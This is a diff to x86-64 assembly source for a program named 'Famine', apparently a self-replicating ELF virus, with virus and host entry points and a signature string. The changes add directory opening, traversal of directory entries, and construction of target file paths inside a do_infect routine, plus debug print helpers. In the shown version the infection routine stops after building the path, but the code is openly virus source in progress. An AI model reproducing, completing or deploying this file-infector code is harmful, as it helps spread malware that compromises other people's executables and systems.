@@ -132,6 +132,7 @@ struc data
     .base_address   resq 1
     .dirent_array   resb DIRENT_ARR_SIZE
     .dir_fd         resq 1
+    .file_path      resq 1
 endstruc
 
 _start:
@@ -159,17 +160,22 @@ _start:
         mov rdi, [r15]
         test rdi, rdi
         jz _host
+        mov r14, rdi
+
+        mov rsi, O_DIRECTORY | O_RDONLY
+        mov rax, SYS_OPEN
+        syscall
+
+        test rax, rax
+        jl .close_directory
+
+        mov data(dir_fd), rax
+
         mov rax, SYS_WRITE
         lea rsi, [rel directory_msg]
         mov rdi, 1
         mov rdx, 4
         syscall
-        mov rsi, O_DIRECTORY | O_RDONLY
-        mov rax, SYS_OPEN
-        syscall
-        test rax, rax
-        jl .close_directory
-        mov data(dir_fd), rax
     .read_directory:
         mov rdx, DIRENT_ARR_SIZE
         lea rsi, data(dirent_array)
@@ -181,6 +187,11 @@ _start:
         xor r13, r13 ; offset counter for directory entries
         mov r12, rax ; number of bytes read by getdents
     .process_file:
+        mov rax, SYS_WRITE
+        mov rdi, 1
+        lea rsi, [rel file_msg]
+        mov rdx, 5
+        syscall
         lea rdi, data(dirent_array)
         add rdi, r13
         ; d_type is the last field in the dirent struct, which has
@@ -216,7 +227,27 @@ _start:
     pop rdi
     jmp rax
 
+; r14 = dirname, rdi = filename
 do_infect:
+    push rdi
+    lea rdi, [rel infect_msg]
+    mov rsi, 7
+    call write
+    pop rdi
+
+    mov rsi, r14
+    mov rax, rdi
+    lea rdi, data(file_path)
+    mov rdx, rdi
+    .directory_name:
+        movsb
+        cmp BYTE [rsi], 0
+        jnz .directory_name
+        mov rsi, rax
+    .file_name:
+        movsb
+        cmp BYTE [rsi - 1], 0
+        jnz .file_name
     jmp exit
 
 ; in: -
@@ -285,6 +316,22 @@ get_base_address:
     ret
 ; get_base_address
 
+; write (rdi=char*, rsi=len)
+write:
+    push rdx
+    push rsi
+
+    mov rax, SYS_WRITE
+    mov rdx, rsi
+    mov rsi, rdi
+    mov rdi, 1
+    syscall
+
+    pop rsi
+    pop rdx
+
+    ret
+
 exit:
     mov rax, SYS_EXIT
     xor rdi, rdi
@@ -309,8 +356,8 @@ file_path:
     db "Famine", 0
 signature:
     db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
-do_infect_msg:
-    db "INFECT", 10
+infect_msg:
+    db "infect", 10
 virus_entry:
     dq _start
 host_entry:
@@ -319,6 +366,8 @@ directory_msg:
     db "dir", 10
 host_msg:
     db "host", 10
+file_msg:
+    db "file", 10
 _end:
 
 _host:
